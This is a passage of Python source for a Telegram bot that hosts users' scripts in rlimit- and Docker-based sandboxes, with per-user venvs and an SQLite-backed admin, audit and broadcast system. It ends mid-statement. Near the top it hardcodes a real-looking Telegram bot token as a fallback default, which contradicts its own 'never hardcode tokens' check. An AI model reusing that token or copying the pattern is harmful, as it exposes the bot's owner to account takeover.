import telebot
import subprocess
import os
import zipfile
import tempfile
import shutil
import math
import random as _random
import types as _types          # moved from inside watchdog/restart loops
from telebot import types
import time
from datetime import datetime, timedelta
import psutil
import sqlite3
import logging
import threading
import re
import sys
import atexit
import requests
import html as _html
import io
import pty
import select
import signal
import resource
import shlex
import docker_sandbox

def _esc(text: str) -> str:
    return _html.escape(str(text), quote=False)

from flask import Flask
from threading import Thread

# ── SECURITY: Resource limits + environment sanitization ──────────────────
MAX_SCRIPT_MEMORY_MB   = 512          # hard virtual memory cap per script
                                       # (RLIMIT_AS counts *virtual* address space, not
                                       # real RAM used — Python + requests/ssl/urllib3
                                       # alone can reserve 300-500MB of VAS from shared
                                       # libs and thread stacks even for tiny scripts.
                                       # 256MB was killing network-capable scripts before
                                       # they could print anything. 512MB still blocks
                                       # genuine memory abuse/fork-bomb style attacks —
                                       # RLIMIT_NPROC/RLIMIT_CPU/RLIMIT_FSIZE below are
                                       # what actually stop real resource-exhaustion abuse.
MAX_SCRIPT_CPU_SECS    = 3600         # 1 hour CPU time per session
MAX_SCRIPT_FILESIZE_MB = 50           # max single file write from script
MAX_SCRIPT_PROCS       = 400          # anti-fork-bomb process cap
                                       # NOTE: RLIMIT_NPROC is enforced per real UID,
                                       # SYSTEM-WIDE — not scoped to this child's own
                                       # process tree. Since all hosted scripts run under
                                       # the same OS user, this ceiling is shared across
                                       # the platform bot + every concurrently running
                                       # user script combined. 25 was low enough that
                                       # normal multi-threaded libraries (telebot's worker
                                       # pool, urllib3, etc.) failed to spawn even one
                                       # thread whenever a handful of other scripts were
                                       # already active — killing new scripts before they
                                       # could print anything. True fork-bomb protection
                                       # should ideally run each user under a distinct
                                       # UID; until then, keep this high enough that
                                       # normal concurrent usage doesn't starve new scripts.
MAX_SCRIPT_OPEN_FILES  = 64           # open file-descriptor cap
MAX_UPLOAD_SIZE_MB     = 5            # max upload size (bytes) per file
MAX_ZIP_EXTRACTED_MB   = 20           # max total size of extracted ZIP

def _make_sandbox_preexec(user_folder: str):
    """
    Returns a preexec_fn called in the child AFTER fork, BEFORE exec.
    Applies hard resource limits so user scripts can't starve the host.
    """
    def _preexec():
        for limit_type, soft, hard in [
            (resource.RLIMIT_AS,    MAX_SCRIPT_MEMORY_MB   * 1024 * 1024,
                                    MAX_SCRIPT_MEMORY_MB   * 1024 * 1024),
            (resource.RLIMIT_CPU,   MAX_SCRIPT_CPU_SECS,    MAX_SCRIPT_CPU_SECS),
            (resource.RLIMIT_FSIZE, MAX_SCRIPT_FILESIZE_MB * 1024 * 1024,
                                    MAX_SCRIPT_FILESIZE_MB * 1024 * 1024),
            (resource.RLIMIT_NPROC, MAX_SCRIPT_PROCS,       MAX_SCRIPT_PROCS),
            (resource.RLIMIT_NOFILE,MAX_SCRIPT_OPEN_FILES,  MAX_SCRIPT_OPEN_FILES),
        ]:
            try:
                resource.setrlimit(limit_type, (soft, hard))
            except Exception:
                pass
        try:
            os.chdir(user_folder)
        except Exception:
            pass
    return _preexec

def _translate_cmd_for_container(user_folder: str, cmd_list):
    """
    Rewrites a host-side argv (interpreter path + script path, both normally
    living under user_folder / user_folder/.venv) into the equivalent
    /workspace-relative argv for `docker exec` inside that user's sandbox
    container. Non-path tokens (e.g. plain 'node') pass through untouched.
    """
    out = []
    for tok in cmd_list:
        try:
            if os.path.isabs(tok) and _path_in_sandbox(tok, user_folder):
                out.append(docker_sandbox.to_container_path(user_folder, tok))
                continue
        except Exception:
            pass
        out.append(tok)
    return out


def _sandboxed_popen_argv(user_id, user_folder, cmd_list, tty=False):
    """
    Returns (argv, used_docker). If the per-user Docker sandbox is available,
    argv launches the command inside that user's persistent container via
    `docker exec`. Otherwise falls back to the plain host argv so callers can
    still run it with the existing rlimit-based _make_sandbox_preexec.
    """
    if docker_sandbox.ensure_user_container(user_id, user_folder):
        container_cmd = _translate_cmd_for_container(user_folder, cmd_list)
        return docker_sandbox.exec_argv(user_id, container_cmd, tty=tty), True
    logger.warning(f"docker_sandbox unavailable for user {user_id}; falling back to rlimit sandbox")
    return cmd_list, False


# NOTE: _build_sandbox_env is defined once, further down this file, near
# _is_path_inside_sandbox / _check_arg_paths. (A duplicate definition used to
# live here and was silently shadowed at runtime by the later one — removed
# to avoid future edits here being ignored again.)

def _path_in_sandbox(path: str, user_folder: str) -> bool:
    """True if resolved path is inside the user's sandbox directory."""
    try:
        resolved = os.path.realpath(os.path.abspath(path))
        sandbox  = os.path.realpath(os.path.abspath(user_folder))
        return resolved == sandbox or resolved.startswith(sandbox + os.sep)
    except Exception:
        return False



app = Flask('')

@app.route('/')
def home():
    return "Bot is running"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    print("Flask Keep-Alive started.")

BOT_START_TIME = datetime.now()

TOKEN = os.environ.get('BOT_TOKEN', '8537018588:AAG9uiSfOlML-X_PS5BrChGsti76Ae7dZow')
if not TOKEN:
    raise RuntimeError("SECURITY: BOT_TOKEN environment variable is not set. "
                       "Never hardcode tokens in source files.")
_owner_raw = os.environ.get('OWNER_ID', '')
_admin_raw = os.environ.get('ADMIN_ID', '')
if not _owner_raw or not _admin_raw:
    raise RuntimeError("SECURITY: OWNER_ID and ADMIN_ID must be set as environment variables.")
OWNER_ID = int(_owner_raw)
ADMIN_ID = int(_admin_raw)
OWNER_USERNAMES = os.environ.get('OWNER_USERNAMES', '@ibullygpt,@s4mhu').split(',') or ['@owner']
UPDATE_CHANNEL  = 'https://t.me/s4mmhu'

SISTER_BOTS = [
    {"name": "🌽 CornPaste Bot",         "username": "cornpastebot",              "desc": ""},
    {"name": "🔐 ",    "username": "bot",    "desc": "R"},
    {"name": "🔐 ",    "username": "2bot",   "desc": "Rets"},
    {"name": "🎵 EC2 Music Bot",         "username": "ec2music_bot",              "desc": "Music streaming and downloads"},
]

BASE_DIR             = os.path.abspath(os.path.dirname(__file__))
UPLOAD_BOTS_DIR      = os.path.join(BASE_DIR, 'upload_bots')
DATA_DIR             = os.path.join(BASE_DIR, 'data')
DATABASE_PATH        = os.path.join(DATA_DIR, 'bot_data.db')
BACKUP_DATABASE_PATH = os.path.join(DATA_DIR, 'bot_backup.db')

FREE_USER_LIMIT      = 6
SUBSCRIBED_USER_LIMIT = 15
ADMIN_LIMIT          = 999
OWNER_LIMIT          = math.inf   # use math.inf instead of float('inf')

os.makedirs(UPLOAD_BOTS_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

telebot.apihelper.ENABLE_MIDDLEWARE = True
bot = telebot.TeleBot(TOKEN, use_class_middlewares=True)

# ── Upgrade: Auto-react on every user message ────────────────────────────
_AUTO_REACT_EMOJIS = ['👍', '🔥', '❤️', '👏', '🤝', '😍', '😁', '⚡', '🎉', '🤩']

@bot.middleware_handler(update_types=['message'])
def _auto_react_middleware(bot_instance, message):
    """Fire-and-forget emoji reaction on every incoming user message. Never blocks the update pipeline."""
    try:
        emoji = _random.choice(_AUTO_REACT_EMOJIS)
        threading.Thread(
            target=lambda: bot_instance.set_message_reaction(
                message.chat.id, message.message_id,
                reaction=[telebot.types.ReactionTypeEmoji(emoji)]
            ),
            daemon=True
        ).start()
    except Exception:
        pass

bot_scripts        = {}
user_subscriptions = {}
user_files         = {}
active_users       = set()
admin_ids          = {ADMIN_ID, OWNER_ID}
bot_locked         = False
terminal_sessions  = {}
terminal_procs     = {}          # proc_id (str pid) -> {'process','user_id','chat_id','cmd','started'}
recovery_mode      = {}          # chat_id -> True when waiting for backup .db file

auto_approve_enabled   = True   # overwritten from DB after init_db() / load_data()
daily_msg_enabled      = True
hourly_backup_enabled  = True   # overwritten from DB after init_db() / load_data() — toggles Telegram DB backup sends
script_input_sessions  = {}
waiting_for_input  = {}
watchdog_running   = False   # crash watchdog no longer auto-starts; owner must start it manually

# ── Upgrade 1: Per-rule severity config ──────────────────────────────────────
# Set of scan-rule labels that have been disabled by admin.
# Loaded from DB key 'disabled_scan_labels' (JSON list) on startup.
_disabled_scan_labels: set = set()

# ── Upgrade 4: Upload rate limiting ──────────────────────────────────────────
# Maps user_id -> list of datetime of recent uploads (rolling 1-hour window).
_upload_timestamps: dict = {}
UPLOAD_RATE_FREE      = 10
UPLOAD_RATE_PREMIUM   = 50   # uploads per hour for premium/subscribed users
UPLOAD_RATE_WINDOW    = 3600 # seconds (1 hour)

DAILY_MESSAGES = [
    "☀️ Hey! How's your day going? Hope everything's running smoothly on our hosting bot! 🚀",
    "👋 Just checking in! Your bots are safe with us. Need help? Just type /start 💙",
    "🌟 Pro tip: Keep your scripts lean and your APIs clean! Happy hosting with us 😊",
    "🔥 Did you know? Premium users get 15 file slots! Upgrade and scale up today 💎",
    "💡 Reminder: Always test locally before uploading. Your bot, your responsibility! 🤖",
    "🎉 Another great day to automate something! What are you building today? 🛠️",
    "🌙 Good evening! How was your day? Your scripts are running fine on our servers ✅",
    "🚀 Start hosting with us to make your day better! We keep your bots alive 24/7 ⚡",
    "💬 Random thought: The best bots are the ones that never sleep. Like yours! 😴❌",
    "📊 Quick check-in! Visit /stats to see your bot usage. Stay on top of things! 📈",
]

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

FILE_STATUS_PENDING  = "pending"
FILE_STATUS_APPROVED = "approved"
FILE_STATUS_REJECTED = "rejected"
FILE_STATUS_BANNED   = "banned"

_INPUT_PROMPT_RE = re.compile(
    r'('
    r'enter\s+(your\s+)?(user\s*id|id|choice|option|name|token|key|value|number|password|input)\b|'
    r'(choose|select|pick)\s+(an?\s+)?(option|choice|number)\b|'
    r'(type|provide|give)\s+(your\s+)?(input|id|choice|value)\b|'
    r'what\s+is\s+your\b|'
    r'please\s+(enter|type|provide|input)\b|'
    r'user\s*id\s*[:>]|'
    r'password\s*[:>]|'
    r'username\s*[:>]|'
    r'choice\s*[:>\(]|'
    r'option\s*[:>\(]|'
    r'input\s*[:>]'
    r')',
    re.IGNORECASE
)

_LOG_NOISE_RE = re.compile(
    r'('
    r'https?://'
    r'|\d+\s*%'
    r'|(?:success|failed|error|warn(?:ing)?|info|debug)\s*[=:]\s*'
    r'|(?:connected|connecting|disconnected|reconnecting)\b'
    r'|(?:starting|started|stopping|stopped|running|ready)\b'
    r'|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
    r'|\[\d{4}-\d{2}-\d{2}'
    r'|^\s*\[(?:INFO|WARN|ERROR|DEBUG|CRITICAL)\]'
    r'|polling|webhook|token|bot\s+is\s+(?:running|alive|online)'
    r'|request\s+to\s+|response\s+from\s+'
    r'|status\s+code\s+\d+'
    r'|\d+\s+(?:bytes|kb|mb|requests?|messages?|users?)\b'
    r'|\[stats\]|rate\s*:\s*[\d.]+\s*/\s*sec'
    r')',
    re.IGNORECASE
)

def _is_input_prompt(line: str) -> bool:
    stripped = line.strip()
    if not stripped or len(stripped) > 200:
        return False
    ends_with_prompt = bool(re.search(r'[:>?\$#]\s*$', stripped))
    is_numbered_menu = bool(re.match(r'^\s*\d+[\.\)]\s+\w+', stripped))
    if not ends_with_prompt and not is_numbered_menu:
        return False
    if _LOG_NOISE_RE.search(stripped):
        return False
    if _INPUT_PROMPT_RE.search(stripped):
        return True
    if ends_with_prompt and len(stripped) <= 60:
        return True
    return False

DB_LOCK          = threading.Lock()
BOT_SCRIPTS_LOCK = threading.Lock()   # Fix #3: protect bot_scripts multi-step ops
_terminal_last_cmd: dict = {}          # Improvement: per-user terminal rate limiting
TERMINAL_COOLDOWN = 2                  # seconds between terminal commands

def _cb(prefix, uid, fname):
    base = f"{prefix}{uid}_"
    available = 64 - len(base.encode())
    fname_bytes = fname.encode()[:available]
    safe_fname = fname_bytes.decode('utf-8', errors='ignore')
    return base + safe_fname

def get_uptime():
    delta = datetime.now() - BOT_START_TIME
    d = delta.days
    h, rem = divmod(delta.seconds, 3600)
    m, s   = divmod(rem, 60)
    return f"{d}d {h}h {m}m {s}s"

# ── NO FORCE-JOIN — all users can access the bot freely ──────────────────

def _user_status_label(user_id):
    if user_id == OWNER_ID:
        return "👑 Owner"
    if user_id in admin_ids:
        return "🛡️ Admin"
    sub = user_subscriptions.get(user_id)
    if sub and sub['expiry'] > datetime.now():
        days_left = (sub['expiry'] - datetime.now()).days
        return f"💎 Premium ({days_left}d)"
    if user_id in user_subscriptions:
        remove_subscription_db(user_id)
    return "👤 Free"

def get_user_folder(user_id):
    folder = os.path.join(UPLOAD_BOTS_DIR, str(user_id))
    os.makedirs(folder, exist_ok=True)
    return folder

# ── Upgrade: User-facing directory creation (max 4 dirs per user) ────────
MAX_USER_DIRS = 4
_VALID_DIRNAME = re.compile(r'^[A-Za-z0-9_-]{1,32}$')

def _list_user_dirs(user_id):
    folder = get_user_folder(user_id)
    try:
        return sorted(
            d for d in os.listdir(folder)
            if os.path.isdir(os.path.join(folder, d)) and not d.startswith('.') and d != '.venv'
        )
    except Exception:
        return []

def create_user_directory(user_id, dirname):
    """
    Creates a new top-level directory inside the user's own sandbox folder.
    Enforces: name validity, no path traversal, and a max of MAX_USER_DIRS dirs.
    Returns (ok: bool, message: str).
    """
    dirname = (dirname or "").strip()
    if not dirname:
        return False, "❌ Please provide a folder name."
    if not _VALID_DIRNAME.match(dirname):
        return False, "❌ Invalid name. Use only letters, numbers, <code>_</code> and <code>-</code> (max 32 chars)."

    folder = get_user_folder(user_id)
    target = os.path.normpath(os.path.join(folder, dirname))
    if not _path_in_sandbox(target, folder):
        return False, "🚫 That path escapes your sandbox directory."

    existing = _list_user_dirs(user_id)
    if os.path.isdir(target):
        return False, f"❌ Folder <code>{_esc(dirname)}</code> already exists."
    if len(existing) >= MAX_USER_DIRS:
        return False, (
            f"🚫 You've reached the max of <b>{MAX_USER_DIRS}</b> folders.\n"
            f"Current: <code>{_esc(', '.join(existing))}</code>\n"
            f"Remove one (via terminal) before creating another."
        )
    try:
        os.mkdir(target)
        return True, f"✅ Folder <code>{_esc(dirname)}</code> created ({len(existing)+1}/{MAX_USER_DIRS})."
    except Exception as e:
        return False, f"❌ Failed to create folder: <code>{_esc(str(e))}</code>"

def delete_user_directory(user_id, dirname):
    """
    Deletes a top-level directory (and its contents) inside the user's own
    sandbox folder. Returns (ok: bool, message: str).
    """
    dirname = (dirname or "").strip()
    folder = get_user_folder(user_id)
    target = os.path.normpath(os.path.join(folder, dirname))

    if not _VALID_DIRNAME.match(dirname):
        return False, "❌ Invalid folder name."
    if not _path_in_sandbox(target, folder) or target == os.path.abspath(folder):
        return False, "🚫 That path is outside your sandbox or is your main directory."
    if not os.path.isdir(target):
        return False, f"❌ Folder <code>{_esc(dirname)}</code> doesn't exist."

    try:
        shutil.rmtree(target)
        return True, f"✅ Folder <code>{_esc(dirname)}</code> deleted."
    except Exception as e:
        return False, f"❌ Failed to delete folder: <code>{_esc(str(e))}</code>"

def get_user_venv_dir(user_id):
    user_folder = get_user_folder(user_id)
    venv_dir = os.path.join(user_folder, '.venv')
    if not os.path.exists(venv_dir):
        try:
            logger.info(f"Creating venv for user {user_id} at {venv_dir}")
            if docker_sandbox.ensure_user_container(user_id, user_folder):
                # Build the venv INSIDE the container so its interpreter/libs
                # match the container's OS rather than the bare host's.
                # /workspace/.venv lands under user_folder/.venv on the host
                # via the bind mount, so every later host-side path check
                # (get_user_python, _path_in_sandbox, etc.) keeps working.
                result = subprocess.run(
                    docker_sandbox.exec_argv(
                        user_id, ['python3', '-m', 'venv', '--copies', f"{docker_sandbox.WORKSPACE_PATH}/.venv"]
                    ),
                    capture_output=True, text=True, timeout=60
                )
            else:
                result = subprocess.run(
                    [sys.executable, '-m', 'venv', '--copies', venv_dir],
                    capture_output=True, text=True, timeout=60
                )
            if result.returncode != 0:
                logger.error(f"venv creation failed for {user_id}: {result.stderr}")
                return None
        except Exception as e:
            logger.error(f"venv creation error for {user_id}: {e}")
            return None
    return venv_dir

def get_user_python(user_id):
    venv_dir = get_user_venv_dir(user_id)
    if not venv_dir:
        return sys.executable
    candidates = [
        os.path.join(venv_dir, 'bin', 'python3'),
        os.path.join(venv_dir, 'bin', 'python'),
        os.path.join(venv_dir, 'Scripts', 'python.exe'),
    ]
    for p in candidates:
        if os.path.exists(p):
            return p
    return sys.executable

def get_user_pip(user_id):
    python = get_user_python(user_id)
    return [python, '-m', 'pip']

def _stop_all_scripts_for_user(user_id):
    """Force-stops every running script owned by user_id (memory + DB mark)."""
    stopped = []
    for key in list(bot_scripts.keys()):
        if key.startswith(f"{user_id}_"):
            info = bot_scripts.get(key)
            if info:
                try:
                    kill_process_tree(info)
                except Exception as e:
                    logger.error(f"_stop_all_scripts_for_user kill: {e}")
                stopped.append(info.get('file_name', key))
            bot_scripts.pop(key, None)
            waiting_for_input.pop(key, None)
    try:
        for uid, fname, ftype, chat_id in get_all_running_scripts():
            if uid == user_id:
                unmark_script_running(uid, fname)
    except Exception as e:
        logger.error(f"_stop_all_scripts_for_user unmark: {e}")
    return stopped

def _test_user_venv(user_id):
    """Runs a trivial command inside the venv to verify it actually works."""
    python = get_user_python(user_id)
    try:
        argv, used_docker = _sandboxed_popen_argv(user_id, get_user_folder(user_id), [python, '-c', 'import sys; print(sys.version.split()[0])'])
        result = subprocess.run(
            argv,
            capture_output=True, text=True, timeout=20
        )
        if result.returncode == 0 and result.stdout.strip():
            return True, result.stdout.strip()
        return False, (result.stderr or result.stdout or 'unknown error').strip()
    except Exception as e:
        return False, str(e)

def _snapshot_user_requirements(user_id) -> int:
    """
    Saves `pip freeze` from the CURRENT venv to <folder>/.last_requirements.txt
    before it gets wiped, so packages can be reinstalled after a reset.
    Returns the number of packages captured (0 if none/failed).
    """
    folder     = get_user_folder(user_id)
    python     = get_user_python(user_id)
    snap_path  = os.path.join(folder, '.last_requirements.txt')
    try:
        result = subprocess.run(
            [python, '-m', 'pip', 'freeze'],
            capture_output=True, text=True, timeout=30
        )
        pkgs = [l for l in result.stdout.splitlines() if l.strip()]
        if pkgs:
            with open(snap_path, 'w') as f:
                f.write("\n".join(pkgs) + "\n")
            return len(pkgs)
        return 0
    except Exception as e:
        logger.error(f"_snapshot_user_requirements: {e}")
        return 0

def reset_user_venv(user_id):
    """
    Snapshots installed packages, stops any running scripts for user_id,
    deletes their .venv, rebuilds it, then checks whether the new venv is
    actually working or crashed.
    Returns (ok, message, stopped_scripts_list, snapshot_pkg_count).
    """
    snapshot_count = _snapshot_user_requirements(user_id)
    stopped  = _stop_all_scripts_for_user(user_id)
    folder   = get_user_folder(user_id)
    venv_dir = os.path.join(folder, '.venv')

    try:
        if os.path.exists(venv_dir):
            shutil.rmtree(venv_dir, ignore_errors=True)
    except Exception as e:
        return False, f"❌ Failed to remove old venv: {_esc(str(e))}", stopped, snapshot_count

    new_dir = get_user_venv_dir(user_id)   # rebuilds it fresh
    if not new_dir or not os.path.exists(new_dir):
        return False, "❌ Venv rebuild failed — could not create a new virtual environment.", stopped, snapshot_count

    ok, detail = _test_user_venv(user_id)
    if ok:
        msg = f"✅ Venv Resetted — checked and it's <b>working fine</b> (Python {_esc(detail)})."
    else:
        msg = (
            f"⚠️ Venv Resetted, but it looks <b>CRASHED / broken</b> after rebuild.\n"
            f"Error: <code>{_esc(detail[:300])}</code>"
        )
    if snapshot_count:
        msg += f"\n\n📦 Saved a snapshot of your {snapshot_count} old package(s) — you can reinstall them below."
    return ok, msg, stopped, snapshot_count

def _reinstall_snapshot_packages(user_id):
    """Runs `pip install -r .last_requirements.txt` for user_id in a background thread."""
    folder    = get_user_folder(user_id)
    snap_path = os.path.join(folder, '.last_requirements.txt')
    if not os.path.exists(snap_path):
        return False, "No saved package snapshot found."
    python = get_user_python(user_id)
    try:
        result = subprocess.run(
            [python, '-m', 'pip', 'install', '--no-input', '-r', snap_path],
            capture_output=True, text=True, timeout=300
        )
        if result.returncode == 0:
            return True, "✅ Old packages reinstalled successfully."
        return False, f"⚠️ Some packages failed to reinstall:\n<code>{_esc(result.stderr[-500:])}</code>"
    except Exception as e:
        return False, f"❌ Reinstall error: {_esc(str(e))}"

def get_user_file_limit(user_id):
    if user_id == OWNER_ID:         return OWNER_LIMIT
    if user_id in admin_ids:        return ADMIN_LIMIT
    sub = user_subscriptions.get(user_id)
    if sub and sub['expiry'] > datetime.now():
        return SUBSCRIBED_USER_LIMIT
    return FREE_USER_LIMIT

def get_user_file_count(user_id):
    return len(user_files.get(user_id, []))

def _get_conn(path):
    return sqlite3.connect(path, check_same_thread=False)

def init_db():
    for db_path in [DATABASE_PATH, BACKUP_DATABASE_PATH]:
        try:
            conn = _get_conn(db_path)
            c = conn.cursor()
            c.executescript('''
                CREATE TABLE IF NOT EXISTS subscriptions
                    (user_id INTEGER PRIMARY KEY, expiry TEXT);
                CREATE TABLE IF NOT EXISTS user_files
                    (user_id INTEGER, file_name TEXT, file_type TEXT,
                     uploaded_at TEXT,
                     PRIMARY KEY (user_id, file_name));
                CREATE TABLE IF NOT EXISTS active_users
                    (user_id INTEGER PRIMARY KEY, first_seen TEXT);
                CREATE TABLE IF NOT EXISTS admins
                    (user_id INTEGER PRIMARY KEY);
                CREATE TABLE IF NOT EXISTS file_approvals
                    (user_id INTEGER, file_name TEXT, status TEXT,
                     reviewed_by INTEGER, review_time TEXT, file_type TEXT,
                     uploaded_time TEXT, message_id INTEGER,
                     ban_reason TEXT,
                     PRIMARY KEY (user_id, file_name));
                CREATE TABLE IF NOT EXISTS running_scripts
                    (user_id INTEGER, file_name TEXT, file_type TEXT,
                     chat_id INTEGER, started_at TEXT,
                     PRIMARY KEY (user_id, file_name));
                CREATE TABLE IF NOT EXISTS settings
                    (key TEXT PRIMARY KEY, value TEXT);
                CREATE TABLE IF NOT EXISTS audit_log
                    (id INTEGER PRIMARY KEY AUTOINCREMENT, ts TEXT,
                     actor_id INTEGER, action TEXT, details TEXT);
                CREATE TABLE IF NOT EXISTS crash_log
                    (id INTEGER PRIMARY KEY AUTOINCREMENT, ts TEXT,
                     user_id INTEGER, file_name TEXT, restart_num INTEGER);
                CREATE TABLE IF NOT EXISTS watchdog_exclude
                    (user_id INTEGER, file_name TEXT,
                     PRIMARY KEY (user_id, file_name));
                CREATE TABLE IF NOT EXISTS scheduled_broadcasts
                    (id INTEGER PRIMARY KEY AUTOINCREMENT, send_at TEXT,
                     text TEXT, photo_id TEXT, created_by INTEGER, sent INTEGER DEFAULT 0);
            ''')
            c.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (OWNER_ID,))
            if ADMIN_ID != OWNER_ID:
                c.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (ADMIN_ID,))
            conn.commit()
            conn.close()
            logger.info(f"DB ready: {db_path}")
        except Exception as e:
            logger.error(f"DB init error ({db_path}): {e}", exc_info=True)

def save_setting(key: str, value: str):
    """Persist a bot setting to DB (survives restart)."""
    for db_path in [DATABASE_PATH, BACKUP_DATABASE_PATH]:
        with DB_LOCK:
            conn = _get_conn(db_path)
            c = conn.cursor()
            try:
                c.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?,?)', (key, value))
                conn.commit()
            except Exception as e:
                logger.error(f"save_setting ({db_path}): {e}")
            finally:
                conn.close()

def load_setting(key: str, default: str = '') -> str:
    """Load a bot setting from DB."""
    try:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        c.execute('SELECT value FROM settings WHERE key=?', (key,))
        row = c.fetchone()
        conn.close()
        return row[0] if row else default
    except Exception:
        return default

# ── AUDIT LOG ──────────────────────────────────────────────────────────────
def log_audit(actor_id: int, action: str, details: str = ''):
    """Append-only record of sensitive/admin actions."""
    now = datetime.now().isoformat(timespec='seconds')
    for db_path in [DATABASE_PATH, BACKUP_DATABASE_PATH]:
        with DB_LOCK:
            conn = _get_conn(db_path)
            c = conn.cursor()
            try:
                c.execute(
                    'INSERT INTO audit_log (ts, actor_id, action, details) VALUES (?,?,?,?)',
                    (now, actor_id, action, details)
                )
                conn.commit()
            except Exception as e:
                logger.error(f"log_audit ({db_path}): {e}")
            finally:
                conn.close()

def get_audit_log(limit: int = 25):
    try:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        c.execute('SELECT ts, actor_id, action, details FROM audit_log ORDER BY id DESC LIMIT ?', (limit,))
        rows = c.fetchall()
        conn.close()
        return rows
    except Exception as e:
        logger.error(f"get_audit_log: {e}")
        return []

# ── CRASH LOG (persisted watchdog history) ─────────────────────────────────
def log_crash(user_id: int, file_name: str, restart_num: int):
    now = datetime.now().isoformat(timespec='seconds')
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            c.execute(
                'INSERT INTO crash_log (ts, user_id, file_name, restart_num) VALUES (?,?,?,?)',
                (now, user_id, file_name, restart_num)
            )
            conn.commit()
        except Exception as e:
            logger.error(f"log_crash: {e}")
        finally:
            conn.close()

def get_crash_counts_since(days: int = 7):
    """Returns list of (user_id, file_name, crash_count) in the last `days` days."""
    try:
        cutoff = (datetime.now() - timedelta(days=days)).isoformat(timespec='seconds')
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        c.execute(
            'SELECT user_id, file_name, COUNT(*) FROM crash_log WHERE ts >= ? '
            'GROUP BY user_id, file_name ORDER BY COUNT(*) DESC LIMIT 20',
            (cutoff,)
        )
        rows = c.fetchall()
        conn.close()
        return rows
    except Exception as e:
        logger.error(f"get_crash_counts_since: {e}")
        return []

# ── PER-SCRIPT WATCHDOG OPT-OUT ─────────────────────────────────────────────
def is_watchdog_excluded(user_id: int, file_name: str) -> bool:
    try:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        c.execute('SELECT 1 FROM watchdog_exclude WHERE user_id=? AND file_name=?', (user_id, file_name))
        row = c.fetchone()
        conn.close()
        return row is not None
    except Exception:
        return False

def set_watchdog_excluded(user_id: int, file_name: str, excluded: bool):
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            if excluded:
                c.execute('INSERT OR IGNORE INTO watchdog_exclude (user_id, file_name) VALUES (?,?)',
                          (user_id, file_name))
            else:
                c.execute('DELETE FROM watchdog_exclude WHERE user_id=? AND file_name=?', (user_id, file_name))
            conn.commit()
        except Exception as e:
            logger.error(f"set_watchdog_excluded: {e}")
        finally:
            conn.close()

# ── SCHEDULED BROADCASTS ────────────────────────────────────────────────────
def add_scheduled_broadcast(send_at: datetime, text: str, photo_id: str, created_by: int) -> int:
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            c.execute(
                'INSERT INTO scheduled_broadcasts (send_at, text, photo_id, created_by) VALUES (?,?,?,?)',
                (send_at.isoformat(timespec='seconds'), text, photo_id, created_by)
            )
            conn.commit()
            return c.lastrowid
        except Exception as e:
            logger.error(f"add_scheduled_broadcast: {e}")
            return -1
        finally:
            conn.close()

def get_due_scheduled_broadcasts():
    try:
        now = datetime.now().isoformat(timespec='seconds')
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        c.execute('SELECT id, text, photo_id, created_by FROM scheduled_broadcasts WHERE sent=0 AND send_at<=?', (now,))
        rows = c.fetchall()
        conn.close()
        return rows
    except Exception as e:
        logger.error(f"get_due_scheduled_broadcasts: {e}")
        return []

def mark_broadcast_sent(bid: int):
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            c.execute('UPDATE scheduled_broadcasts SET sent=1 WHERE id=?', (bid,))
            conn.commit()
        except Exception as e:
            logger.error(f"mark_broadcast_sent: {e}")
        finally:
            conn.close()

def get_pending_scheduled_broadcasts():
    try:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        c.execute('SELECT id, send_at, text, created_by FROM scheduled_broadcasts WHERE sent=0 ORDER BY send_at')
        rows = c.fetchall()
        conn.close()
        return rows
    except Exception as e:
        logger.error(f"get_pending_scheduled_broadcasts: {e}")
        return []

def cancel_scheduled_broadcast(bid: int) -> bool:
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            c.execute('DELETE FROM scheduled_broadcasts WHERE id=? AND sent=0', (bid,))
            conn.commit()
            return c.rowcount > 0
        except Exception as e:
            logger.error(f"cancel_scheduled_broadcast: {e}")
            return False
        finally:
            conn.close()

def load_data():
    logger.info("Loading data...")
    try:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        c.execute('SELECT user_id, expiry FROM subscriptions')
        for uid, expiry in c.fetchall():
            try:
                user_subscriptions[uid] = {'expiry': datetime.fromisoformat(expiry)}
            except ValueError:
                pass
        c.execute('SELECT user_id, file_name, file_type FROM user_files')
        for uid, fname, ftype in c.fetchall():
            user_files.setdefault(uid, [])
            if not any(f[0] == fname for f in user_files[uid]):
                user_files[uid].append((fname, ftype))
        c.execute('SELECT user_id FROM active_users')
        active_users.update(r[0] for r in c.fetchall())
        c.execute('SELECT user_id FROM admins')
        admin_ids.update(r[0] for r in c.fetchall())
        admin_ids.add(OWNER_ID)
        admin_ids.add(ADMIN_ID)
        conn.close()
        logger.info(f"Loaded {len(active_users)} users, {len(user_subscriptions)} subs, {len(admin_ids)} admins.")
    except Exception as e:
        logger.error(f"Error loading data: {e}", exc_info=True)

init_db()
load_data()

# ── Load persisted settings (override module-level defaults) ──────────────
auto_approve_enabled = load_setting('auto_approve_enabled', 'true').lower() == 'true'
daily_msg_enabled    = load_setting('daily_msg_enabled',    'true').lower() == 'true'
hourly_backup_enabled = load_setting('hourly_backup_enabled', 'true').lower() == 'true'

# Upgrade 1: load disabled scan rule labels
import json as _json_settings
_disabled_raw = load_setting('disabled_scan_labels', '[]')
try:
